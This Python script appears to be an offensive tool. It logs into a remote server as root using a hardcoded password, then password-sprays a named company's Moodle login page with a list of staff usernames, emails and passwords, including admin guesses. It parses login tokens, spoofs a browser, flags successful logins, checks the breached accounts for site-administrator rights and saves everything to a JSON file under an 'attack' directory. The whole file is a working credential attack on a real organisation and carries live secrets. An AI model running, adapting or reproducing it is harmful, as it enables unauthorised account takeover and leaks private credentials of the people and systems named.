#!/usr/bin/env python3
"""
HEXAGON GLM 5.2 - FINDEP Moodle Login
Output: UTF-8 safe.
"""
import paramiko
import json
import time
import re
import sys
import io
from datetime import datetime, timezone

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"
VPS_USER = "root"
VPS_PASS = "5F.jyTK$D6%.F{a="

MOODLE_URL = "https://universidad.findep.mx/login/index.php"
MOODLE_BASE = "https://universidad.findep.mx"

CREDS = [
    ("aguzmango", "Capacita-1"),
    ("bmendezar", "Findep2021"),
    ("jsanchezfern", "Findep2021"),
    # Variaciones
    ("admin", "Findep2021"),
    ("admin", "Capacita-1"),
    ("aguzmango", "Findep2021"),
    ("bmendezar", "Capacita-1"),
    ("jsanchezfern", "Capacita-1"),
    # Probar con emails
    ("aguzmango@findep.com.mx", "Capacita-1"),
    ("bmendezar@findep.com.mx", "Findep2021"),
    ("jsanchezfern@findep.com.mx", "Findep2021"),
]

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode("utf-8", errors="replace")
    err = stderr.read().decode("utf-8", errors="replace")
    return out, err

def safe_print(s, maxlen=4000):
    try:
        s = str(s)
        if len(s) > maxlen:
            s = s[:maxlen] + "...[truncated]"
        print(s)
    except Exception:
        print(repr(s)[:maxlen])

def main():
    print(f"[*] Conectando a VPS {VPS_HOST}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Conectado")

    log = {}

    # 1. GET login page
    print("\n[*] === Moodle login page ===")
    cookie_file = "/tmp/moodle_cookies.txt"
    cmd = (
        f"curl -sk -m 20 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
        f"-c {cookie_file} '{MOODLE_URL}' -o /tmp/moodle_login.html 2>&1; "
        f"wc -c /tmp/moodle_login.html"
    )
    out, _ = ssh_exec(client, cmd, timeout=25)
    print(f"  Login page: {out.strip()}")

    cmd = "cat /tmp/moodle_login.html"
    out, _ = ssh_exec(client, cmd, timeout=15)
    html = out
    print(f"  HTML size: {len(html)}")
    log["login_page_size"] = len(html)
    log["login_page"] = html

    # Buscar login token y campos del form
    token_match = re.search(r'name="logintoken"\s+value="([^"]+)"', html)
    logintoken = token_match.group(1) if token_match else ""
    print(f"  Login token: {logintoken}")

    form_action = re.search(r'<form[^>]*action="([^"]+)"', html)
    action_url = form_action.group(1) if form_action else MOODLE_URL
    print(f"  Form action: {action_url}")
    log["logintoken"] = logintoken
    log["form_action"] = action_url

    # 2. Probar creds
    print("\n[*] === Moodle login spray ===")
    spray_results = []
    for user, pwd in CREDS:
        # Refresh login token
        cmd_refresh = (
            f"curl -sk -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
            f"-c {cookie_file} '{MOODLE_URL}' -o /tmp/moodle_refresh.html"
        )
        ssh_exec(client, cmd_refresh, timeout=20)
        cmd_token = "grep -oP 'name=\"logintoken\"\\s+value=\"[^\"]+\"' /tmp/moodle_refresh.html | head -1"
        out, _ = ssh_exec(client, cmd_token, timeout=10)
        m = re.search(r'value="([^"]+)"', out)
        token = m.group(1) if m else logintoken

        resp_file = f"/tmp/moodle_resp_{int(time.time()*1000)}.html"
        cmd_post = (
            f"curl -sk -m 25 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
            f"-b {cookie_file} -c {cookie_file} "
            f"-e '{MOODLE_URL}' "
            f"--data-urlencode 'username={user}' "
            f"--data-urlencode 'password={pwd}' "
            f"--data-urlencode 'logintoken={token}' "
            f"-o {resp_file} "
            f"-w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' "
            f"'{MOODLE_URL}'"
        )
        out, err = ssh_exec(client, cmd_post, timeout=30)
        print(f"  {user}:{pwd} -> {out.strip()}")
        cmd_check = f"head -c 2000 {resp_file}"
        resp_body, _ = ssh_exec(client, cmd_check, timeout=10)
        # Detectar éxito
        success = False
        success_indicators = ["dashboard", "mycourses", "miscursos", "cerrar sesión", "log out", "logout", "Mi página", "Mypage", "/my/"]
        failure_indicators = ["loginerror", "invalidlogin", "login failed", "incorrect login", "Usuario o contraseña", "Invalid login"]
        body_lower = resp_body.lower()
        for ind in success_indicators:
            if ind.lower() in body_lower:
                success = True
                break
        if not success:
            for ind in failure_indicators:
                if ind.lower() in body_lower:
                    success = False
                    break
        # Moodle redirect a /login/again = fail, /my/ = success
        if "REDIR:" in out and "/my/" in out:
            success = True
        if "REDIR:" in out and "loginerrors" in out:
            success = False
        print(f"    success_guess: {success}")
        spray_results.append({
            "user": user,
            "password": pwd,
            "response": out.strip(),
            "body_preview": resp_body[:2000],
            "success_guess": success,
        })
        time.sleep(1.5)

    log["spray_results"] = spray_results

    # 3. Para los exitosos, explorar dashboard
    print("\n[*] === Verificar sesiones exitosas ===")
    for r in spray_results:
        if r["success_guess"]:
            user = r["user"]
            pwd = r["password"]
            print(f"\n[+] Re-login {user} para verificar...")
            cmd_refresh = (
                f"curl -sk -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
                f"-c {cookie_file} '{MOODLE_URL}' -o /dev/null"
            )
            ssh_exec(client, cmd_refresh, timeout=20)
            cmd_token = "grep -oP 'name=\"logintoken\"\\s+value=\"[^\"]+\"' /tmp/moodle_refresh.html | head -1"
            out, _ = ssh_exec(client, cmd_token, timeout=10)
            m = re.search(r'value="([^"]+)"', out)
            token = m.group(1) if m else logintoken

            cmd_post = (
                f"curl -sk -m 25 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
                f"-b {cookie_file} -c {cookie_file} -L "
                f"--data-urlencode 'username={user}' "
                f"--data-urlencode 'password={pwd}' "
                f"--data-urlencode 'logintoken={token}' "
                f"-o /tmp/moodle_dash_{user}.html "
                f"-w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
                f"'{MOODLE_URL}'"
            )
            out, _ = ssh_exec(client, cmd_post, timeout=30)
            print(f"  Dashboard: {out.strip()}")
            cmd = f"grep -i 'loginerror\\|invalid login\\|login failed\\|dashboard\\|my courses\\|mis cursos\\|cerrar sesión\\|log out\\|perfil\\|profile\\|admin\\|administrador' /tmp/moodle_dash_{user}.html | head -20"
            out, _ = ssh_exec(client, cmd, timeout=10)
            safe_print(f"  Indicators: {out}")
            r["dashboard_check"] = out

            # Verificar si es admin
            cmd = f"grep -i 'site admin\\|site administration\\|administración del sitio\\|settings.php\\|admin/settings' /tmp/moodle_dash_{user}.html | head -10"
            out, _ = ssh_exec(client, cmd, timeout=10)
            r["admin_check"] = out
            safe_print(f"  Admin check: {out}")

    # 4. Guardar
    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_moodle.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Moodle guardado en {out_file}")

    client.close()

if __name__ == "__main__":
    main()
